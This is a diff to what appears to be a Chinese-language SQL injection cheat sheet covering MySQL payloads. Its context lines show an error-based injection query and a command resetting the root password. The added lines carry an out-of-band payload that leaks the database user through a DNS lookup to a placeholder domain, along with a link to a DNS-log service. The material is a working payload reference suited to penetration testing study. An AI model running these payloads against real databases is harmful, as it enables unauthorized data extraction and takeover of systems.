@@ -43,6 +43,11 @@ MySQL Payload
     - ``select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))``
 - Change Password
     - ``mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;"``
+- DNS log
+    - ``select load_file(concat('\\\\',user(),'.your-dnslog.com'));``
+    - `dnslog <http://dnslog.cn/>`_
+
+**注意：mysql 5.0 之后才有** ``infomation_schema`` **这个表**
 
 报错注入常见函数
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
